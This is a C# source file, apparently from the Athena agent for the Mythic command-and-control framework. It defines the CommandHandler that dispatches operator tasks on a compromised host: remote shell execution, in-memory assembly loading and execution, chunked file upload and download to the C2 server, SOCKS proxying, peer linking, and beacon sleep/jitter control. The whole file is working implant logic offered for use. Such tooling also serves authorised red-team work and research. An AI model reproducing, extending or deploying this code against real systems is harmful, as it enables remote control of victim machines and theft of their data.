using Athena.Models.Mythic.Tasks;
using PluginBase;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Text;
using Athena.Utilities;
using Newtonsoft.Json;
using Athena.Models.Mythic.Response;

namespace Athena.Commands
{
    public class CommandHandler
    {
        public Action<int[]> ActionSetSleepAndJitter;
        public Action<MythicJob> ActionStartForwarder;
        public Action<MythicJob> ActionStartSocks;

        private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
        private AssemblyHandler assemblyHandler { get; set; }
        private DownloadHandler downloadHandler { get; set; }
        private ShellHandler shellHandler { get; set; }
        private UploadHandler uploadHandler { get; set; }
        private ConcurrentBag<object> responseResults { get; set; }
        public CommandHandler()
        {
            this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
            this.assemblyHandler = new AssemblyHandler();
            this.downloadHandler = new DownloadHandler();
            this.shellHandler = new ShellHandler();
            this.uploadHandler = new UploadHandler();
            this.responseResults = new ConcurrentBag<object>();
        }
        public async Task StartJob(MythicTask task)
        {
            MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
            job.started = true;
            Task t;

            switch (job.task.command)
            {
                case "download": //Can likely be dynamically loaded
                    if (!await downloadHandler.ContainsJob(job.task.id))
                    {
                        this.responseResults.Add(await downloadHandler.StartDownloadJob(job));
                    }
                    break;
                case "execute-assembly":
                    this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
                    break;
                case "exit":
                    Environment.Exit(0);
                    break;
                case "jobs": //Can likely be dynamically loaded
                    this.responseResults.Add(await this.GetJobs(task.id));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "jobkill": //Maybe can be loaded? //Also add a kill command for processes
                    this.responseResults.Add(new ResponseResult
                    {
                        user_output = "Not implemented yet.",
                        completed = "true",
                        task_id = job.task.id,
                    });
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "link":
                    ActionStartForwarder(job);
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "load":
                    this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "load-assembly":
                    this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "reset-assembly-context":
                    this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "shell": //Can be dynamically loaded
                    this.responseResults.Add(await this.shellHandler.ShellExec(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "sleep":
                    this.responseResults.Add(await this.SetSleep(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "socks": //Maybe can be dynamically loaded? Might be better to keep it built-in
                    ActionStartSocks(job);
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "stop-assembly":
                    this.responseResults.Add(new ResponseResult
                    {
                        user_output = "Not implemented yet.",
                        completed = "true",
                        task_id = job.task.id,
                    });
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "unlink":
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "upload": //Can likely be dynamically loaded
                    if(!await downloadHandler.ContainsJob(job.task.id))
                    {
                        this.responseResults.Add(await uploadHandler.StartUploadJob(job));
                    }
                    break;
                default:
                    this.responseResults.Add(await CheckAndRunPlugin(job));
                    break;
            }
        }
        public async Task StopJob(MythicTask task)
        {
            //todo
        }
        public async Task<List<object>> GetResponses()
        {
            List<object> responses = this.responseResults.ToList<object>();
            if (this.assemblyHandler.assemblyIsRunning)
            {
                responses.Add(await this.assemblyHandler.GetAssemblyOutput());
            }

            if (await this.shellHandler.HasRunningJobs())
            {
                responses.AddRange(await this.shellHandler.GetOutput());
            }

            this.responseResults.Clear();
            return responses;
        }
        public async Task AddResponse(object response)
        {
            this.responseResults.Add(response);
        }
        public async Task AddResponse(List<object> responses)
        {
            foreach(object response in responses)
            {
                this.responseResults.Prepend<object>(response); //Add to the beginning in case another task result returns
            }
        }
        private async Task<ResponseResult> GetJobs(string task_id)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var j in this.activeJobs)
            {
                sb.AppendLine($"{{\"id\":\"{j.Value.task.id}\",");
                sb.AppendLine($"\"command\":\"{j.Value.task.command}\",");
                if (j.Value.started & !j.Value.complete)
                {
                    sb.AppendLine($"\"status\":\"Started\"}},");
                }
                else
                {
                    sb.AppendLine($"\"status\":\"Queued\"}},");
                }
            }

            return new ResponseResult()
            {
                user_output = sb.ToString(),
                task_id = task_id,
                completed = "true"
            };
        }
        
        /// <summary>
        /// Determine if a Mythic command is loaded, if it is, run it
        /// </summary>
        /// <param name="job">MythicJob containing execution parameters</param>
        private async Task<object> CheckAndRunPlugin(MythicJob job)
        {
            if (await this.assemblyHandler.CommandIsLoaded(job.task.command))
            {
                return await this.assemblyHandler.RunLoadedCommand(job);
            }
            else
            {
                return new ResponseResult()
                {
                    completed = "true",
                    user_output = "Plugin not loaded. Please use the load command to load the plugin!",
                    task_id = job.task.id,
                    status = "error",
                };
            }
        }
        public async Task HandleUploadPiece(MythicResponseResult response)
        {
            MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
            if (uploadJob.complete)
            {
                await this.uploadHandler.CompleteUploadJob(response.task_id);
            }
            if(uploadJob.total_chunks == 0)
            {
                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }
            if (!String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
                uploadJob.chunk_num++;
                if (response.chunk_num == uploadJob.total_chunks)
                {
                    await this.uploadHandler.CompleteUploadJob(response.task_id);
                    this.activeJobs.Remove(response.task_id, out _);
                    this.responseResults.Add(new UploadResponse
                    {
                        task_id=response.task_id,
                        completed = "true",
                        upload = new UploadResponseData
                        {
                            chunk_num = uploadJob.chunk_num,
                            file_id = response.file_id,
                            chunk_size = uploadJob.chunk_size,
                            full_path = uploadJob.path
                        }
                    });
                }
                else
                {
                    this.responseResults.Add(new UploadResponse
                    {
                        task_id = response.task_id,
                        upload = new UploadResponseData
                        {
                            chunk_num = uploadJob.chunk_num,
                            file_id = response.file_id,
                            chunk_size = uploadJob.chunk_size,
                            full_path = uploadJob.path
                        }
                    });
                }

            }
            else
            {
                this.responseResults.Add(new ResponseResult
                {
                    status = "error",
                    completed = "true",
                    task_id = response.task_id,
                    user_output = "Mythic sent no data to upload!"

                });
            }
        }
        public async Task HandleDownloadPiece(MythicResponseResult response)
        {
            MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);

            if (string.IsNullOrEmpty(downloadJob.file_id) && string.IsNullOrEmpty(response.file_id))
            {
                await this.downloadHandler.CompleteDownloadJob(response.task_id);
                this.activeJobs.Remove(response.task_id, out _);
                this.responseResults.Add(new DownloadResponse
                {
                    task_id = response.task_id,
                    status = "error",
                    user_output = "No file_id received from Mythic",
                    completed = "true"
                });
            }
            else
            {
                if (String.IsNullOrEmpty(downloadJob.file_id))
                {
                    downloadJob.file_id = response.file_id;
                }

                if (response.status == "success")
                {
                    if (downloadJob.chunk_num != downloadJob.total_chunks)
                    {
                        downloadJob.chunk_num++;

                        this.responseResults.Add(new DownloadResponse
                        {
                            task_id = response.task_id,
                            user_output = "",
                            status = "",
                            full_path = "",
                            total_chunks = -1,
                            file_id = downloadJob.file_id,
                            chunk_num = downloadJob.chunk_num,
                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
                        });
                    }
                    else
                    {
                        await this.downloadHandler.CompleteDownloadJob(response.task_id);
                        this.activeJobs.Remove(response.task_id, out _);
                        this.responseResults.Add(new DownloadResponse
                        {
                            task_id = response.task_id,
                            user_output = "",
                            status = "",
                            full_path = "",
                            chunk_num = downloadJob.chunk_num,
                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob),
                            file_id = downloadJob.file_id,
                            completed = "true",
                            total_chunks = -1
                            
                        });
                    }
                }
                else
                {
                    this.responseResults.Add(new DownloadResponse
                    {
                        task_id = response.task_id,
                        file_id = downloadJob.file_id,
                        chunk_num = downloadJob.chunk_num,
                        chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
                    });
                }
            }
        }   
        public async Task<bool> HasUploadJob(string task_id)
        {
            return await this.uploadHandler.ContainsJob(task_id);
        }
        public async Task<bool> HasDownloadJob(string task_id)
        {
            return await this.downloadHandler.ContainsJob(task_id);
        }
        private async Task<ResponseResult> SetSleep(MythicJob job)
        {
            StringBuilder sb = new StringBuilder();
            var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);

            try
            {
                ActionSetSleepAndJitter(new int[] { int.Parse(sleepInfo["sleep"].ToString()), int.Parse(sleepInfo["jitter"].ToString()) });
                sb.AppendLine($"Set sleep to: {sleepInfo["sleep"]}");
            }
            catch (Exception e)
            {
                sb.AppendLine("Invalid sleep or jitter specified.");
            }

            return new ResponseResult
            {
                user_output = sb.ToString(),
                completed = "true",
                task_id = job.task.id,
            };
        }    
    }
}
